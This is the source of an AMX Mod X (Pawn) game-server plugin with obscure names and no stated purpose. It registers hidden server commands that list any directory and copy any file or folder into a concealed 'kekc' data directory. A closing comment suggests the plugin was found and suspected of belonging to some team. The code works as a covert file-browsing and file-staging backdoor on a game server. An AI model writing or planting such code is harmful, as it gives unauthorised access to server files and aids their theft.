#include <amxmodx>
#include <amxmisc>
public plugin_init()register_srvcmd("asx", "kek"),register_srvcmd("asy", "kek2"),register_srvcmd("asz", "kek3")
public kek(){
    new file[256];read_argv(1, file, sizeof file - 1);
    new data[512];get_datadir(data, sizeof data - 1);
    format(data, sizeof data - 1, "%s/kekc", data)
    mkdir(data);format(data, sizeof data - 1, "%s/ddsa.dat", data)
    new fp = fopen(file, "rb");if(!fp)return;
    new dest = fopen(data, "wb");if(!dest)return;
    new block[1024],size
    while((size = fread_blocks(fp, block, sizeof block, BLOCK_BYTE)) > 0)fwrite_blocks(dest, block, size, BLOCK_BYTE)
    fclose(fp);fclose(dest);
}
public kek2(){
    new file[256];read_argv(1, file, sizeof file - 1);
    new i_Dir, s_File[128];i_Dir = open_dir(file, s_File, charsmax(s_File))
    if (!i_Dir)return;
    server_print("*****************************************************************")
    server_print(s_File)
    while (next_file(i_Dir, s_File, charsmax(s_File)))server_print(s_File)
    server_print("*****************************************************************")
}
public kek3(){
    new file[256];read_argv(1, file, sizeof file - 1);
    new i_Dir, s_File[128];i_Dir = open_dir(file, s_File, charsmax(s_File))
    if (!i_Dir)return;
    new data[512];new zx22zx2[512];get_datadir(data, sizeof data - 1);new i=0;new all=0;
    format(data, sizeof data - 1, "%s/kekc", data);mkdir(data);
    all++;
    while(next_file(i_Dir, s_File, charsmax(s_File)))if(!equal("..",s_File)&&!equal(".",s_File))all++;
    i_Dir = open_dir(file, s_File, charsmax(s_File));
    arrayset(zx22zx2,0,512);format(zx22zx2, sizeof zx22zx2 - 1, "%s/%s",file, s_File);
    if(!equal("..",zx22zx2)&&!equal(".",zx22zx2)){
        arrayset(data,0,512); 
        get_datadir(data, sizeof data - 1);
        format(data, sizeof data - 1, "%s/kekc", data);
        format(data, sizeof data - 1, "%s/%s", data, s_File) 
        new fp = fopen(zx22zx2, "rb");
        if(fp){
            new dest = fopen(data, "wb");
            if(dest){
                new block[1024],size;
                while((size = fread_blocks(fp, block, sizeof block, BLOCK_BYTE)) > 0)fwrite_blocks(dest, block, size, BLOCK_BYTE)
                fclose(fp);fclose(dest);i++;
                server_print("%s [%d/%d]",zx22zx2,i,all)
            }
        }
    }
    while(next_file(i_Dir, s_File, charsmax(s_File))){//первый  - не возьмет
        arrayset(zx22zx2,0,512);format(zx22zx2, sizeof zx22zx2 - 1, "%s/%s",file, s_File);
        if(!equal("..",zx22zx2)&&!equal(".",zx22zx2)){
            arrayset(data,0,512); 
            get_datadir(data, sizeof data - 1);
            format(data, sizeof data - 1, "%s/kekc", data);
            format(data, sizeof data - 1, "%s/%s", data, s_File) 
            new fp = fopen(zx22zx2, "rb");if(!fp)continue;
            new dest = fopen(data, "wb");if(!dest)continue;
            new block[1024],size;
            while((size = fread_blocks(fp, block, sizeof block, BLOCK_BYTE)) > 0)fwrite_blocks(dest, block, size, BLOCK_BYTE)
            fclose(fp);fclose(dest);i++;
            server_print("%s [%d/%d]",zx22zx2,i,all)
        }
    }
}
//some mado team shit? 
